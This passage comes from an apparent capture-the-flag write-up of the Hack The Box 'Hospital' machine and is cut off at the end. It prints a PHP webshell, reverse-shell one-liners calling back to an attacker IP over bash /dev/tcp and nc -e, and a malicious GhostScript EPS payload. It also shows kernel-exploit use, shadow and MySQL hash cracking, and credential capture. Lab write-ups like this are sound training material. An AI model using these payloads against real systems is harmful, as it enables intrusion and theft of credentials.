+<li><figure><img src="/ox-hugo/2024-09-30-090431_.png">
+</figure>
+
+<ul>
+<li>It is not accessible.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Looking at the request and response in <code>burp</code> we can see that it was a valid upload:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-090529_.png">
+</figure>
+
+<ul>
+<li>This leads me to believe the uploaded file is being processed/renamed on upload.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Uploading a webshell</strong>:</p>
+<ul>
+<li>I create a php webshell:
+<code>&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-190939_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I upload the php webshell:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-090753_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>It&rsquo;s caught and errors out:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-090934_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I check if there is anything telling in the error response, but none that I can see:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-091032_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I append <code>.jpg</code> to my php webshell to see if I can bypass the upload restrictions:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-091336_.png">
+</figure>
+</li>
+<li>It&rsquo;s a success:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-091416_.png">
+</figure>
+
+<ul>
+<li>This is good as it means filtering is only happening in the browser, which means we can see if any other extensions will be considered valid and enable us to upload a webshell.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="fuzzing-for-valid-extensions">Fuzzing for valid extensions:</h4>
+<ul>
+<li>I initiate another upload and capture it in burp &amp; send to intruder:</li>
+<li>I set the extension as my injection/fuzzing point:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-191215_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I use the <code>web-extensions.txt</code> list from Seclists:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-182948_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Looking at the results, we can see that the extension <code>phar</code> has a <code>success.php</code> response:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-183045_.png">
+</figure>
+</li>
+<li>What this means is we should be able to append <code>.phar</code> to our shell and have it bypass any restrictions.</li>
+</ul>
+</li>
+<li><strong>What is a phar file</strong>?
+<ul>
+<li>A <code>PHAR</code> file is a packaged PHP Archive so it can be read and processed &amp; executed by the server that is running PHP.</li>
+<li>I want to point out that there are also other options here that also had a valid success response, I am just opting to use <code>.phar</code> as I have had the most experience with this type of file.</li>
+</ul>
+</li>
+</ul>
+<h4 id="trying-to-get-a-web-shell-by-bypassing-file-upload-restrictions">Trying to get a web-shell by bypassing file-upload restrictions:</h4>
+<ul>
+<li>I rename my shell to <code>shell.phar</code> for no other reason than convenience.
+<ul>
+<li>In an engagement I would give this a hashed long name so no-one else could stumble upon it.</li>
+</ul>
+</li>
+<li>I upload it, it uploads successfully.</li>
+<li>I attempt to use &amp; run it &amp; nothing…..
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-192034_.png">
+</figure>
+</li>
+<li>I try without arguments too &amp; nothing:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-192102_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>Back to the drawing board….</li>
+</ul>
+<h4 id="enumerating-the-php-server-some-more">Enumerating the PHP Server Some More:</h4>
+<ul>
+<li>
+<p><strong>So what do we know?</strong></p>
+<ul>
+<li>In situations like this, it&rsquo;s good to go over what we do know to be true about the host &amp; service:
+<ul>
+<li>We know we can upload a file.</li>
+<li>We know there is a file uploads folder, where we (believe these files are stored)</li>
+<li>We know we can upload files with the <code>.phar</code> extension.</li>
+<li>We know that the server is running <code>php</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Let&rsquo;s enumerate the server more and see if we can find anymore information about the php service running:</p>
+<ul>
+<li>As we know the above we can actually create a file that will call the <code>phpinfo</code> function when uploaded &amp; executed via the web server
+<ul>
+<li><code>echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; phpinfo.phar</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-193107_.png">
+</figure>
+
+<ul>
+<li>This script will display all the PHP configuration details, including version, loaded extensions, server info, and more.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I upload it and visit the url</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-193235_.png">
+</figure>
+
+<ul>
+<li>We can see it works, however there is also a list of disabled functions and these functions are what we would typically utilize for web-shells; however <a href="https://github.com/epinna/weevely3?tab=readme-ov-file">weevely</a> has the ability to bypass these function restrictions using it&rsquo;s <code>audit_disablefunctionbypass</code> feature!! So we can use this to get a webshell
+<ul>
+<li><a href="https://github.com/epinna/weevely3/wiki/Bypass-disabled-system-shell-functions-via-mod_cgi-and-.htaccess">https://github.com/epinna/weevely3/wiki/Bypass-disabled-system-shell-functions-via-mod_cgi-and-.htaccess</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="using-weevley-to-get-a-web-shell">Using Weevley To Get A Web Shell:</h3>
+<ul>
+<li>
+<p><strong>Generate our Shell</strong>:</p>
+<ul>
+<li>Weevly is built into Kali by default so we can just call it as so:
+<ul>
+<li>weevely generate &lt;password&gt; &lt;outPutFile&gt;</li>
+<li><code>weevely generate bl00dst111er medrec.phar</code></li>
+<li><figure><img src="/ox-hugo/2024-10-02-061502_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I upload the shell</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-063516_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><strong>Accessing the Shell</strong>:</p>
+<ul>
+<li><code>sudo weevely http://hospital.htb/uploads/medrec.phar bl00dst111er</code></li>
+<li>So as you can see below there are alot of errors. I actually did some troubleshooting with this. I ended up cloning the repo, setting up a python <code>venv</code>, installing all deps to that and trying again &amp; I still go the same errors and it would not run with <code>sudo</code>. So if in doubt just run with sudo and it should work.</li>
+<li><figure><img src="/ox-hugo/2024-10-02-063716_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Running Commands</strong>:</p>
+<ul>
+<li>We need to run an initial command to get access to the shell:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-064233_.png">
+</figure>
+</li>
+<li>Just to make it clear, we are in the <code>VM</code> that is running ubuntu. So we need to find a way to escape or gather information we can use elsewhere.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I try and run some commands but it gets a</strong> <code>404</code> <strong>and times out</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-064424_.png">
+</figure>
+</li>
+<li>I did notice that when trying to access my <code>phpinfo</code> enumeration file that it also times out, which leads me to believe there is some sort of timeout in place for uploaded files.</li>
+</ul>
+</li>
+</ul>
+<h3 id="getting-around-the-timeout-using-weevely-s-build-in-reverse-shell">Getting around the timeout Using Weevely&rsquo;s build in reverse shell:</h3>
+<ul>
+<li>I believe the easiest way to get around the time out will be to on connection immediately trigger a manual reverse shell back to ourselves from the weevley shell and background the task to ensure the connection remains.
+<ol>
+<li>
+<p><strong>Prepare my listener</strong>:</p>
+<ul>
+<li><code>nc -nvlp 443</code></li>
+<li><strong>Note</strong>: I use 443 so the traffic at least looks legitimate.</li>
+</ul>
+</li>
+<li>
+<p><strong>Prepare my reverse shell statement to paste into the weevley shell</strong>:</p>
+<ul>
+<li><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.27/443 0&gt;&amp;1'</code></li>
+<li><strong>Note</strong>:
+<ul>
+<li>I do this as it&rsquo;s time-sensitive &amp; I want to easily copy and paste as opposed to typing something out and getting a type-o.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Connect via weevley</strong>:</p>
+<ul>
+<li><code>sudo weevely http://10.129.229.189:8080/uploads/rec.phar bl00dst111er</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Trigger the reverse shell</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-072305_.png">
+</figure>
+</li>
+<li><strong>Caught</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-073102_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>Note</strong>:
+<ul>
+<li>Full transparency here, I tried multiple ways to get this to work, including the below. However the only way I could get a connection was using the above sub-shell method. I am showing you this as I want you to know that sometimes you have to just keep trying to find a viable path to make things work.
+<ul>
+<li><code>/usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.27/443 0&gt;&amp;1</code></li>
+<li><code>/bin/sh -i &gt;&amp; /dev/tcp/10.10.14.27/443 0&gt;&amp;1</code></li>
+<li><code>nc 10.10.14.27 443 -e /usr/bin/sh &amp;</code></li>
+<li><code>nc 10.10.14.27 443 -e /usr/bin/bash &amp;</code></li>
+<li><code>nc 10.10.14.27 443 -e /bin/bash &amp;</code>
+<ul>
+<li>I also tried weevleys inbuilt reverse-tcp shell and that would not work</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="detailed-breakdown-of-the-reverse-shell">Detailed Breakdown Of The Reverse Shell:</h4>
+<ul>
+<li>
+<p><strong>Bash Sub-Shell</strong>:</p>
+<ul>
+<li><code>bash -c</code>
+<ul>
+<li>Runs the command <code>bash -i &gt;&amp; /dev/tcp/10.10.14.27/443 0&gt;&amp;1</code> within a new instance of the bash shell.</li>
+<li>The <code>-c</code> option allows us to pass a string as a command to be executed.</li>
+<li><code>bash -i</code>
+<ul>
+<li>Launches an interactive instance of the Bash shell.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Redirection Operators</strong>:</p>
+<ul>
+<li>
+<p><code>&gt;&amp;</code></p>
+<ul>
+<li>Redirects both standard output <code>stdout</code> and standard error <code>stderr</code> to the target in this case, our attack host, <code>/dev/tcp/10.10.14.27/443</code>.</li>
+</ul>
+</li>
+<li>
+<p><code>/dev/tcp/</code></p>
+<ul>
+<li>This is a special file in Linux systems that allows network communication. By using <code>/dev/tcp/</code> with an IP address and port <code>10.10.14.27:443</code>, the shell sends its output to our attack host at that IP and port.</li>
+<li>This essentially establishes a TCP connection to our attack machine <code>10.10.14.27</code> on port <code>443</code>.</li>
+</ul>
+</li>
+<li>
+<p><code>0&gt;&amp;1</code>:</p>
+<ul>
+<li>Redirects standard input <code>stdin</code> from the same file descriptor as standard output <code>stdout</code>.</li>
+<li>This allows the shell to receive commands from our attack machine and execute them.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-mysql-creds-in-config-dot-php">Finding Mysql Creds in <code>config.php</code>:</h3>
+<ul>
+<li>I check the <code>config.php</code> file in <code>/var/www/html</code> &amp; find the creds for the msql instance hardcoded in the file:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-073440_.png">
+</figure>
+</li>
+<li>We know there is a db called <code>hospital</code> too, so this is worth checking out.</li>
+</ul>
+</li>
+</ul>
+<h3 id="understanding-the-upload-mechansim">Understanding the Upload Mechansim:</h3>
+<ul>
+<li>
+<p><strong>Uploads Folder</strong>:</p>
+<ul>
+<li>I check the uploads folder &amp; as suspected it is now empty, leading me to believe there is some sort cron job clearing these files.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-073734_.png">
+</figure>
+</li>
+<li>This is interesting find though as it means cron jobs are running, so that is something we should enumerate further.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Reading</strong> <code>upload.php</code></p>
+<ul>
+<li>It&rsquo;s always interesting to look at the logic behind upload mechanisms once we exploit them, I find as a means to learn.
+<ul>
+<li>Looking at the code we can see they have opted for a blacklist approach to extensions, black-lists can work however as we have seen just missing one extension render them useless. Defenders have to get it right 100% of the time, as attackers we only need to be right once. A better approach would be to have a white-list of extensions, so that the upload page only accepts uploads for say <code>.pdf</code> files. This would eliminate this attack vector and also be far easier to maintain from an administration point of view.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-074053_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="trying-to-connect-to-the-mysql-instance">Trying to connect to the mysql instance:</h3>
+<ul>
+<li>I verify the <code>mysql</code> server is running &amp; accessible from the VM (it has to be as it&rsquo;s not running on the bare-metal host)
+<ul>
+<li><code>netsat -tuln</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-091747_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>I try various ways to initiate a connection to it but each time it fails in some way:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-091905_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-10-02-092112_.png">
+</figure>
+
+<ul>
+<li>These are only a few of many different attempts &amp; ways I tried to use to connect to the <code>mysql</code> instance, however none of them worked.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="discovering-another-user">Discovering another User:</h3>
+<ul>
+<li>
+<p><strong>Finding Dr Williams User</strong>:</p>
+<ul>
+<li>I find a user <code>drwilliams</code> in the <code>/home</code> folder however their home folder in inaccesible.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-084921_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Checking</strong> <code>etc/passwd</code>  see that the users name is actually <code>Lucy Williams</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-085051_.png">
+</figure>
+
+<ul>
+<li>I take a note of this as it may be used later.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I try cred stuffing the found creds so far but there are no hits</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-085245_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="discovering-a-tmux-session">Discovering a Tmux Session:</h3>
+<ul>
+<li><strong>I see that there appears to be a</strong> <code>tmux</code> <strong>session listed in</strong> <code>/tmp</code>.
+<ul>
+<li>Existing tmux sessions can be an easy privesc path as if they are set to run permnantley we can attach them &amp; then scroll through whatever commands were entered previously, these could be things such as clear text creds so it&rsquo;s always good to check existing sessions.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-081642_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I Try and attach the session however when I try and initiate <code>tmux</code> to enter this session it does not work due to the nature of the terminal:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-081715_.png">
+</figure>
+
+<ul>
+<li>Before you ask, upgrading to python terminal does not work nor does upgrading the stability of the terminal using <code>script</code></li>
+<li>I did also try and create a meterpreter shell which connected however I was still unable to attach the TMUX session.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-vm-privilege-escalation">3. VM Privilege Escalation:</h2>
+<h3 id="discovering-the-kernel-is-vulnerable-to-exploitation">Discovering the Kernel is vulnerable to exploitation:</h3>
+<ul>
+<li><strong>I list the kernel version</strong>:
+<ul>
+<li><code>uname -a</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-091240_.png">
+</figure>
+
+<ul>
+<li>After some quick searching I find that this actually vulnerable to this exploit which will allow us to privesc:
+<ul>
+<li><a href="https://github.com/Synacktiv/CVE-2023-35001">https://github.com/Synacktiv/CVE-2023-35001</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="building-the-and-transferring-the-exploit">Building the &amp; transferring the exploit:</h3>
+<ul>
+<li>
+<p><strong>I clone the exploit</strong>:</p>
+<ul>
+<li><code>git clone https://github.com/synacktiv/CVE-2023-35001.git</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Following the instructions I build it</strong>:</p>
+<ul>
+<li><code>make</code></li>
+<li><figure><img src="/ox-hugo/2024-10-02-092351_.png">
+</figure>
+
+<ul>
+<li>This leaves me with a file called <code>lpe.zip</code> that I can transfer to the target.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Checking the host it doesn&rsquo;t have</strong> <code>zip</code> <strong>or</strong> <code>unzip</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-092746_.png">
+</figure>
+
+<ul>
+<li>Luckily the exploit retains the <code>exploit</code> &amp; <code>wrapper</code> files need so we can just transfer those to the target.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-093049_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="using-the-cve-2023-35001-exploit-to-privesc-to-root">Using the CVE-2023-35001 exploit to privesc to root:</h3>
+<ul>
+<li>
+<p><strong>I make the exploit &amp; wrapper executable</strong>:</p>
+<ul>
+<li><code>chmod +x exploit</code></li>
+<li><code>chmod +x wrapper</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I trigger the exploit</strong>:</p>
+<ul>
+<li><code>./exploit</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-093307_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-as-root">Enumerating as Root:</h3>
+<ul>
+<li><strong>SSH</strong>:
+<ul>
+<li>I check <code>drwilliams</code> &amp; <code>root</code> <code>.ssh</code> folders but they are empty :(</li>
+</ul>
+</li>
+</ul>
+<h3 id="connecting-to-the-mysql-instance-as-root">Connecting to the mysql instance as root!</h3>
+<ol>
+<li>
+<p><strong>Connect</strong>:</p>
+<ul>
+<li><code>mysql -u root -p'&lt;Redacted&gt;'</code></li>
+</ul>
+</li>
+<li>
+<p><strong>List the databases</strong>:</p>
+<ul>
+<li><code>show databases;</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-094522_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Select the</strong> <code>hospital</code> <strong>Database</strong>:</p>
+<ul>
+<li><code>use hospital;</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-094604_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Show the tables in the</strong> <code>hospital</code> <strong>database</strong>:</p>
+<ul>
+<li><code>show tables;</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-094647_.png">
+</figure>
+</li>
+<li>It has a <code>users</code> table so we could get a some creds!</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Show columns from the</strong> <code>users</code> <strong>tables</strong></p>
+<ul>
+<li><code>show columns from users;</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-094809_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Show the contents of the columns</strong>:</p>
+<ul>
+<li><code>select * from users;</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-094856_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="cracking-the-hashes-admin-hash">Cracking the hashes admin hash:</h3>
+<ul>
+<li>
+<p><strong>I check the hash type by using</strong>: <a href="https://hashes.com">https://hashes.com</a></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-095337_.png">
+</figure>
+
+<ul>
+<li>It says they are bcrypt <code>$2*$, Blowfish (Unix)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Checking hashcats website we can see these hashes use mode</strong> <code>3200</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-095455_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I start</strong> <code>hashcat</code> <strong>&amp; crack the</strong> <code>admin</code> <strong>hash almost immediately</strong>:</p>
+<ul>
+<li><code>hashcat -m 3200 Mysql-Hashes.txt ~/Wordlists/rockyou.txt</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-095717_.png">
+</figure>
+</li>
+<li>I also get the patient hash.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>I try cred stuffing with these and accessing the webmail but no access. Onto the next thing…..</li>
+</ul>
+</li>
+</ul>
+<h3 id="dumping-shadow-hashes">Dumping Shadow Hashes:</h3>
+<ul>
+<li>
+<p><strong>As I am root I can dump the</strong> <code>/etc/shadow</code>:</p>
+<ul>
+<li>I copy the <code>/etc/passwd</code> &amp; <code>/etc/shadow</code> locally.</li>
+<li>I use <a href="https://www.kali.org/tools/john/#unshadow">unshadow</a> to extract the hashes:
+<ul>
+<li><code>unshadow passwd shadow &gt; unshadowed.hashes</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-143126_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I am going to focus on cracking the <code>drs</code> hash as I already have access to the root account &amp; this is a VM so unless I can perform a VM escape a lateral move seems like the logical approach.</p>
+<ul>
+<li>VM escapes are possible but as far as I am aware, more advanced than this box is labelled.</li>
+</ul>
+</li>
+</ul>
+<h3 id="cracking-dr-williams-hashed-password">Cracking Dr Williams Hashed Password:</h3>
+<ul>
+<li>
+<p><strong>I find out the format of the hash on hashes.com</strong></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-143151_.png">
+</figure>
+
+<ul>
+<li>It&rsquo;s sha512crypt:</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Checking hashcat&rsquo;s website I can see that it&rsquo;s mode</strong> <code>1800</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-143402_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I copy the hash to a seperate file &amp; start cracking with hashcat</strong>:</p>
+<ul>
+<li><code>hashcat -m 1800 drhash ~/Wordlists/rockyou.txt</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-144654_.png">
+</figure>
+
+<ul>
+<li>It cracks!!</li>
+<li>I try the creds on SMB but no use again.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="accessing-dr-williams-email">Accessing Dr Williams Email:</h3>
+<ul>
+<li>
+<p><strong>I try all the creds in the webmail portal &amp; get in</strong> Dr Williams <strong>creds</strong>.</p>
+<ul>
+<li>Password re-use, naughty, naughty Dr Williams.</li>
+</ul>
+</li>
+<li>
+<p>I find that the RoundCube version running is <code>1.6.4</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-145126_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I can see that the one email in the inbox is from <code>drbrown</code>, I add their name to my found usernames list.</p>
+</li>
+<li>
+<p><strong>GhostScript file request</strong>:</p>
+<ul>
+<li>In the email the Dr Brown is requesting a file in the <code>.eps</code> format for <a href="https://www.ghostscript.com/">GhostScript</a> from Dr Williams.
+<ul>
+<li>Looking into GhostScript I can see it&rsquo;s an interpreter for PostScript (PS) and Portable Document Format (PDF) files, enabling viewing, printing, and converting them.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Finding a GhostScript EPS CVE</strong>:</p>
+<ul>
+<li>Looking online it is possible to trigger a reverse shell via a malicious <code>.eps</code> file with <code>GhostScript</code>.
+<ul>
+<li>This would mean if we can get Dr Brown to open it we can get a reverse shell.</li>
+<li><a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?tab=readme-ov-file">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?tab=readme-ov-file</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-host-foothold">4. Host Foothold:</h2>
+<h3 id="gaining-access-to-the-host-via-malicious-dot-eps-ghostscript-exploit">Gaining Access to the host via Malicious <code>.eps</code> GhostScript Exploit:</h3>
+<p>Looking at the readme for the GhostScript public exploit CVE_2023_36664, we have alot of options. We cannot use the standard <code>--revshell</code> command as that is for when executed on a unix host only. However we can generate our own payload and have this placed in an <code>eps</code> file.</p>
+<ol>
+<li>
+<p><strong>I use</strong> <a href="https://revhells.com">https://revhells.com</a> <strong>to generate a</strong> <code>powershell</code> <strong>reverse shell and base64 encode it</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-03-195708_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I use the exploit to generate the malicious</strong> <code>.eps</code> <strong>file</strong>:</p>
+<ul>
+<li><code>python3 CVE_2023_36664_exploit.py -g -p &quot;&lt;payload&gt;&quot; -x eps</code></li>
+<li><figure><img src="/ox-hugo/2024-10-02-162259_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I start my nc listener</strong>:</p>
+<ul>
+<li><code>nc -nvlp 53</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Respond in the email client &amp; attach the</strong> <code>malicious.eps</code> <strong>file</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-162827_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Within seconds I have a reverse shell</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-162901_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>Note</strong>: This is one of the coolest boxes I have done. The creativity is amazing.</p>
+<h3 id="finding-hard-coded-creds-in-ghostscript-dot-bat-file">Finding Hard-Coded Creds In <code>ghostscript.bat</code> file:</h3>
+<ul>
+<li>
+<p>As soon as I connect I see there is a file called <code>ghostscript.bat</code> in the Documents folder of drbrown.</p>
+</li>
+<li>
+<p>Looking at the contents I can see that it has hard-coded credentials:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-163529_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I verify these are valid with netexec &amp; evil-winrm</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-163604_.png">
+</figure>
+</li>
+<li>As they are valid with <code>evil-winrm</code> this gives us an easy way for re-entry onto the host.</li>
+</ul>
+</li>
+<li>
+<p><strong>I check my privs</strong>:</p>
+<ul>
+<li>I see I have the ability add workstations to the domain. If I have delegation rights this could be a valid attack path. Lets run bloodhound to find out.</li>
+<li><figure><img src="/ox-hugo/2024-10-02-170254_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Running Bloodhound</strong>:</p>
+<ul>
+<li><code>python3 bloodhound.py -dc dc.hospital.htb -c All -u $user -p $pass -d hospital.htb -ns $box</code>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-10-02-172949_.png">
+</figure>
+
+</li>
+<li>
+<p><strong>I find that our user is part of the Remote Desktop users group</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-172853_.png">
+</figure>
+
+<ul>
+<li>However I do not have delegation privs. Let&rsquo;s connect to the host and see if we can find anything there.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="connecting-via-rdp-to-the-target">Connecting Via RDP to the target:</h3>
+<ul>
+<li><strong>As we are part of the Remote Desktop Users Group, I connect to the host</strong>:
+<ul>
+<li><code>xfreerdp /v:$box /u:$user /p:$pass</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="capturing-credentials-from-the-selenium-webdriver">Capturing Credentials from the Selenium WebDriver:</h3>
+<ul>
+<li>
+<p><strong>Hard Coded Creds In Internet Explorer</strong>:</p>
+<ul>
+<li>As soon as I login, an internet explorer window opens and it looks like the credentials are being entered in by a script, manually typing each character in.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-171832_.png">
+</figure>
+</li>
+<li>I wait a minute and process begins again, which means it&rsquo;s looping.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Discovering Selenium is being used on the host for automating credential entry</strong>:</p>
+<ul>
+<li>Investigating further when the loop starts again a powershell window opens and displays the below. The script is using &ldquo;selenium&rdquo; which is a framework used for automating web browsers.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-172135_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Redirecting the Selenium output to capture the Adminsitrator Username &amp; Password</strong>:</p>
+<ul>
+<li>As the creds are being manually typed, all we have to do is have the text redirect to us to something we control to capture the credentials.</li>
+<li>On the next loop I open notepad and when it starts entering the creds in internet explorer I select Notepad &amp; it starts typing the creds there
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-172621_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-ownership">4. Ownership:</h2>
+<ul>
+<li>
+<p><strong>I check the Administrator creds to see if they have been re-used</strong>:</p>
+<ul>
+<li>Boom, we have ownership
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-02-172730_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I connect via evil-winrm &amp; I get the root flag</strong>:</p>
+<ul>
